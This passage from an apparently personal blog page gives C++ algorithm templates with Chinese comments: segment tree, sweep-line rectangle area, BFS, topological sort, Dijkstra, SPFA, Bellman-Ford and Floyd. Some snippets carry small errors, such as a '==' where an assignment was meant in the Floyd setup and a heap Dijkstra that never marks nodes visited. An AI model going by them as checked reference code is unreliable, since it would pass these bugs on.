class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;k);</span><br><span class="line">            <span class="built_in">modify</span>(<span class="number">1</span>,l,r,k,<span class="number">1</span>);<span class="comment">//只加不乘则mul=1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,<span class="built_in">query</span>(<span class="number">1</span>,l,r)%m);<span class="comment">//这里还是要取模</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="扫描线"><a href="#扫描线" class="headerlink" title="扫描线"></a><a href="https://www.luogu.com.cn/problem/P5490">扫描线</a></h4><ol>
<li>cnt表示当前区间整个被覆盖个数</li>
<li>len不考虑祖先节点的cnt的前提下,cnt&gt;0的区间长度</li>
</ol>
<p>每次都是查询一整个区间,所以永远在query是只用考虑根节点信息,不需要pushdown</p>
<p>所有操作成对出现,并且先加后减,并且是只用被覆盖了就好了,覆盖的次数多少对计算面积无影响</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">1e5</span>+<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">vector&lt;ll&gt; ys;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">segment</span>&#123;</span><br><span class="line">ll x,y1,y2;</span><br><span class="line"><span class="type">int</span> k;<span class="comment">//权值</span></span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> segment &amp;t)<span class="type">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x&lt;t.x;</span><br><span class="line">&#125;</span><br><span class="line">&#125;seg[N*<span class="number">2</span>];<span class="comment">//存的是点,在sort中会将点以x从小往大的顺序排序</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> l,r,cnt;</span><br><span class="line">    ll len;<span class="comment">//在这里面存的是边,ys[tr[u].r+1]~ys[tr[u].l]的边</span></span><br><span class="line">&#125;tr[N*<span class="number">8</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(ll y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">lower_bound</span>(ys.<span class="built_in">begin</span>(),ys.<span class="built_in">end</span>(),y)-ys.<span class="built_in">begin</span>();<span class="comment">//返回第一个不小于给定值的迭代器-开头迭代器===&gt;返回元素所在位置</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushup</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(tr[u].cnt)tr[u].len=ys[tr[u].r+<span class="number">1</span>] -ys[tr[u].l];</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span>(tr[u].l!=tr[u].r)&#123;tr[u].len=tr[u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].len+tr[u&lt;&lt;<span class="number">1</span>].len;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> tr[u].len=<span class="number">0</span>;<span class="comment">//叶节点,当cnt=0归零时,len要重置</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    tr[u]=&#123;l,r,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span>(l!=r)&#123;</span><br><span class="line">        <span class="type">int</span> mid=r+l&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">build</span>(u&lt;&lt;<span class="number">1</span>,l,mid),<span class="built_in">build</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(tr[u].l&gt;=l&amp;&amp;tr[u].r&lt;=r)&#123;</span><br><span class="line">        tr[u].cnt+=k;</span><br><span class="line">        <span class="built_in">pushup</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> mid=tr[u].l+tr[u].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">modify</span>(u&lt;&lt;<span class="number">1</span>,l,r,k);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">modify</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,l,r,k);</span><br><span class="line">        <span class="built_in">pushup</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            ll x1,x2,y1,y2;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld%lld%lld&quot;</span>,&amp;x1,&amp;y1,&amp;x2,&amp;y2);</span><br><span class="line">            seg[j++]=&#123;x1,y1,y2,<span class="number">1</span>&#125;,seg[j++]=&#123;x2,y1,y2,<span class="number">-1</span>&#125;;<span class="comment">//把所有的点都存进去</span></span><br><span class="line">            ys.<span class="built_in">push_back</span>(y1),ys.<span class="built_in">push_back</span>(y2);<span class="comment">//离散化准备</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(ys.<span class="built_in">begin</span>(),ys.<span class="built_in">end</span>());<span class="comment">//从小到大排序</span></span><br><span class="line">        ys.<span class="built_in">erase</span>(<span class="built_in">unique</span>(ys.<span class="built_in">begin</span>(),ys.<span class="built_in">end</span>()),ys.<span class="built_in">end</span>());<span class="comment">//去重,离散化完成</span></span><br><span class="line">         <span class="built_in">build</span>(<span class="number">1</span>,<span class="number">0</span>,ys.<span class="built_in">size</span>()<span class="number">-2</span>);<span class="comment">//tr中存的是边,一共有2n个点,从零开始建树,树中的每一个节点表示的都是一个区间,最右是ys大小-2</span></span><br><span class="line">        <span class="built_in">sort</span>(seg,seg+<span class="number">2</span>*n);<span class="comment">//以x升序排序</span></span><br><span class="line">        ll res=<span class="number">0</span>;<span class="comment">//准备计数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n*<span class="number">2</span>;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(i&gt;<span class="number">0</span>)res+=tr[<span class="number">1</span>].len*(seg[i].x-seg[i<span class="number">-1</span>].x);</span><br><span class="line">           <span class="built_in">modify</span>(<span class="number">1</span>,<span class="built_in">find</span>(seg[i].y1),<span class="built_in">find</span>(seg[i].y2)<span class="number">-1</span>,seg[i].k);<span class="comment">//右端点要减一</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,res);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="图论"><a href="#图论" class="headerlink" title="图论"></a>图论</h1><h2 id="bfs"><a href="#bfs" class="headerlink" title="bfs"></a>bfs</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">110</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; pii;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> g[N][N], d[N][N];<span class="comment">//g负责存地图，d负责记录有没有走过</span></span><br><span class="line">pii q[N * N],p[N ][N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bfs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> dx[<span class="number">4</span>] = &#123; <span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span> &#125;, dy[<span class="number">4</span>] = &#123; <span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span> &#125;;</span><br><span class="line">	<span class="type">int</span> hh = <span class="number">0</span>, tt = <span class="number">0</span>;<span class="comment">//采用栈的形式进行数据的堆叠</span></span><br><span class="line">	<span class="built_in">memset</span>(d, <span class="number">-1</span>, <span class="keyword">sizeof</span> d);</span><br><span class="line">	q[<span class="number">0</span>] = &#123; <span class="number">0</span>,<span class="number">0</span> &#125;;</span><br><span class="line">	d[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (hh &lt;= tt) &#123;</span><br><span class="line">		<span class="keyword">auto</span> t = q[hh++];</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">			<span class="type">int</span> x = t.first + dx[i], y = t.second + dy[i];<span class="comment">//上下左右遍历</span></span><br><span class="line">			<span class="keyword">if</span> (x &gt;= <span class="number">0</span> &amp;&amp; x &lt; n &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; y &lt; m &amp;&amp; g[x][y] == <span class="number">0</span> &amp;&amp; d[x][y] == <span class="number">-1</span>) &#123;</span><br><span class="line">				d[x][y] = d[t.first][t.second] + <span class="number">1</span>;<span class="comment">//记录他是几号点</span></span><br><span class="line">			<span class="comment">//	d[x][y] = 1;</span></span><br><span class="line">				p[x][y] = t;<span class="comment">//把上一个点塞进去了，类似于递归</span></span><br><span class="line">				q[++tt] = &#123; x,y &#125;;<span class="comment">//满足条件则往栈顶压入数据</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//输出路迳   </span></span><br><span class="line">	<span class="type">int</span> x = n - <span class="number">1</span>, y = m - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (x || y) &#123;</span><br><span class="line">		cout &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; y &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">auto</span> t = p[x][y];</span><br><span class="line">		x = t.first, y = t.second;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> d[n - <span class="number">1</span>][m - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n&gt;&gt;m;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)cin &gt;&gt; g[i][j];</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;<span class="built_in">bfs</span>()&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="图的拓扑排序"><a href="#图的拓扑排序" class="headerlink" title="图的拓扑排序"></a>图的拓扑排序</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//有向无环图一定有拓扑序列</span></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> h[N], e[N], ne[N], idx;</span><br><span class="line"><span class="type">int</span> q[N], d[N];<span class="comment">//q[N]为队列，d[N]是入度</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	e[idx] = b, ne[idx] = h[a], h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">topsort</span><span class="params">()</span> </span>&#123;<span class="comment">//队列中hh是对头，tt是队尾</span></span><br><span class="line">	<span class="type">int</span> hh = <span class="number">0</span>, tt = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!d[i])q[++tt] = i;&#125;<span class="comment">//将入度为0的点放进队列</span></span><br><span class="line">		<span class="keyword">while</span> (hh &lt;= tt) &#123;</span><br><span class="line">			<span class="type">int</span> t = q[hh++];</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i]) &#123;</span><br><span class="line">				<span class="type">int</span> j = e[i];</span><br><span class="line">				d[j]--;<span class="comment">//让入度减减</span></span><br><span class="line">				<span class="keyword">if</span> (d[j] == <span class="number">0</span>)q[++tt] = j;<span class="comment">//当入度减为零了，将他压入队列</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> tt == n - <span class="number">1</span>;<span class="comment">//判断它是不是有向无环图</span></span><br><span class="line">&#125;<span class="comment">//q中存的就是拓扑排好的序列,d存的是每个点的入度</span></span><br></pre></td></tr></table></figure>
<h2 id="dijkstra"><a href="#dijkstra" class="headerlink" title="dijkstra"></a>dijkstra</h2><h3 id="朴素dijkstra"><a href="#朴素dijkstra" class="headerlink" title="朴素dijkstra"></a>朴素dijkstra</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> g[N][N];</span><br><span class="line"><span class="type">int</span> dist[N];</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dijkstra</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(st, <span class="literal">false</span>, <span class="keyword">sizeof</span> st);</span><br><span class="line">	dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">-1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j =<span class="number">1</span>; j &lt;=n; j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!st[j] &amp;&amp; (t == <span class="number">-1</span> || dist[t] &gt; dist[j]))</span><br><span class="line">				t = j;</span><br><span class="line">		&#125;</span><br><span class="line">		st[t] = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">			dist[j] =<span class="built_in">min</span>(dist[j], dist[t] + g[t][j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (dist[n] == <span class="number">0x3f3f3f3f</span>)<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> dist[n];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	<span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">	<span class="built_in">memset</span>(g, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> g);</span><br><span class="line">	<span class="keyword">while</span> (m--) &#123;</span><br><span class="line">		<span class="type">int</span> a, b, c;</span><br><span class="line">		cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">		g[a][b] = <span class="built_in">min</span>(g[a][b], c);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> t = <span class="built_in">dijkstra</span>();</span><br><span class="line">	cout &lt;&lt; t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="堆优化dijkstra"><a href="#堆优化dijkstra" class="headerlink" title="堆优化dijkstra"></a>堆优化dijkstra</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//有向图求最短路</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">510</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> w[N], h[N], e[N], ne[N], idx;</span><br><span class="line"><span class="type">int</span> dist[N];</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; pii;</span><br><span class="line">priority_queue&lt;pii, vector&lt;pii&gt;, greater&lt;pii&gt;&gt; heap;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">	e[idx] = b, w[idx] = c, ne[idx] = h[a], h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dijkstra</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dist ,<span class="number">0x3f</span>,<span class="keyword">sizeof</span> dist);</span><br><span class="line">	<span class="built_in">memset</span>(st, <span class="literal">false</span>, <span class="keyword">sizeof</span> st);</span><br><span class="line">	heap.<span class="built_in">push</span>(&#123; <span class="number">0</span>,<span class="number">1</span> &#125;);<span class="comment">//0表示dist【】，</span></span><br><span class="line">	<span class="keyword">while</span> (heap.<span class="built_in">size</span>()) &#123;</span><br><span class="line">     <span class="keyword">auto</span> t = heap.<span class="built_in">top</span>();</span><br><span class="line">	 heap.<span class="built_in">pop</span>();</span><br><span class="line">	 <span class="type">int</span> distance = t.first, val = t.second;</span><br><span class="line">	 <span class="keyword">if</span> (st[val])<span class="keyword">continue</span>;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> i = h[val]; ~i; i = ne[i]) &#123;</span><br><span class="line">	      <span class="type">int</span> j = e[i];</span><br><span class="line">		   <span class="keyword">if</span> (dist[j] &gt; distance+w[i])  &#123; </span><br><span class="line">					  dist[j] = distance + w[i];</span><br><span class="line">                    heap.<span class="built_in">push</span>(&#123; dist[j],j &#125;);<span class="comment">//前一项表示到1的距离，后一项表示这个点</span></span><br><span class="line">				  &#125;   </span><br><span class="line">		      &#125;</span><br><span class="line">	     &#125;</span><br><span class="line">     <span class="keyword">if</span> (dist[n] == <span class="number">0x3f3f3f3f</span>)<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	 <span class="keyword">else</span> <span class="keyword">return</span> dist[n];</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h2 id="SPFA"><a href="#SPFA" class="headerlink" title="SPFA"></a>SPFA</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//spfa算法求单源最短路迳，可以有负环</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">10010</span>;</span><br><span class="line"><span class="type">int</span> ne[N], idx, e[N], h[N], w[N];</span><br><span class="line"><span class="type">int</span> dist[N];</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span>  c)</span> </span>&#123;</span><br><span class="line">	e[idx] = b, ne[idx] = h[a], w[idx] = c, h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">spfa</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(st, <span class="literal">false</span>, <span class="keyword">sizeof</span> st);</span><br><span class="line">	<span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">	dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">	q.<span class="built_in">push</span>(<span class="number">1</span>);</span><br><span class="line">	st[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">while</span> (q.<span class="built_in">size</span>()) &#123;</span><br><span class="line">		<span class="type">int</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">			q.<span class="built_in">pop</span>();</span><br><span class="line">			st[t] = <span class="literal">false</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> i = h[t]; ~i; i = ne[i]) &#123;</span><br><span class="line">				<span class="type">int</span> j = e[i];</span><br><span class="line">				<span class="keyword">if</span> (dist[j] &gt; dist[t] + w[i]) &#123;</span><br><span class="line">					dist[j] = dist[t] + w[i];</span><br><span class="line">					<span class="comment">//cnt[j]=cnt[t]+1; if(cnt[j]&gt;=n)return true;判断负环</span></span><br><span class="line">					<span class="keyword">if</span> (!st[j]) &#123;</span><br><span class="line">						q.<span class="built_in">push</span>(j);</span><br><span class="line">						st[j] = <span class="literal">true</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;	</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (dist[n] == <span class="number">0x3f3f3f3f</span>)<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> dist[n];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	<span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">		<span class="type">int</span> a, b, c;</span><br><span class="line">		cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">		<span class="built_in">add</span>(a, b, c);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> t = <span class="built_in">spfa</span>();</span><br><span class="line">	<span class="keyword">if</span> (t == <span class="number">-1</span>)cout &lt;&lt; <span class="string">&quot; no&quot;</span>;</span><br><span class="line">	<span class="keyword">else</span> cout &lt;&lt; t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="bell-man-ford"><a href="#bell-man-ford" class="headerlink" title="bell-man ford"></a>bell-man ford</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在边数限定条件的最短路</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span>  N = <span class="number">10010</span>;</span><br><span class="line"><span class="type">int</span> dist[N], backup[N];</span><br><span class="line"><span class="type">int</span> n, m, k;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">	<span class="type">int</span> a, b, w;</span><br><span class="line">&#125;edge[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bellman_ford</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">	dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">		<span class="built_in">memcpy</span>(backup, dist, <span class="keyword">sizeof</span> dist);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">			<span class="type">int</span> x = edge[j].a, y = edge[j].b, z = edge[j].w;</span><br><span class="line">			dist[y] = <span class="built_in">min</span>(dist[y], backup[x] + z);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (dist[n] &gt;<span class="number">0x3f3f3f3f</span> / <span class="number">2</span>)<span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//存在负权，有可能是0x3f3f3f3f-2，小于0x3f3f3f3f</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> dist[n];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m &gt;&gt; k;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">		<span class="type">int</span> x, y, z;</span><br><span class="line">		cin &gt;&gt; x &gt;&gt; y &gt;&gt; z;</span><br><span class="line">		edge[i] = &#123; x,y,z &#125;;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> t = <span class="built_in">bellman_ford</span>();</span><br><span class="line">	<span class="keyword">if</span> (t == <span class="number">-1</span>)cout &lt;&lt; <span class="string">&quot;impossible&quot;</span>;</span><br><span class="line">	<span class="keyword">else</span> cout &lt;&lt; t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="floyd"><a href="#floyd" class="headerlink" title="floyd"></a>floyd</h2><p><a href="https://www.luogu.com.cn/problem/solution/B3647"><strong>要是忘了请看讲解</strong></a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">210</span>,inf=<span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="type">int</span> n, m, q;</span><br><span class="line"><span class="type">int</span> dist[N][N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">floyd</span><span class="params">()</span> </span>&#123;<span class="comment">//基于动态规划的算法的k次前k-1次的点有关</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= n; k++)</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">				dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i][k] + dist[k][j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m &gt;&gt; q;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;			</span><br><span class="line">			<span class="keyword">if</span> (i == j)dist[i][j] == <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span> dist[i][j] = inf;</span><br><span class="line">		 &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (m--) &#123;<span class="comment">//录入防止重边</span></span><br><span class="line">		<span class="type">int</span> x, y, z;</span><br><span class="line">		cin &gt;&gt; x &gt;&gt; y &gt;&gt; z;</span><br><span class="line">		dist[x][y] = <span class="built_in">min</span>(dist[x][y],z);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">floyd</span>();</span><br><span class="line">	<span class="keyword">while</span> (q--) &#123;<span class="comment">//输出多源最短路</span></span><br><span class="line">		<span class="type">int</span> a, b;</span><br><span class="line">		cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">		<span class="keyword">if</span> (dist[a][b] &gt; inf / <span class="number">2</span>)cout &lt;&lt; <span class="string">&quot;impossible&quot;</span>;</span><br><span class="line">		<span class="keyword">else</span> cout &lt;&lt; dist[a][b];</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
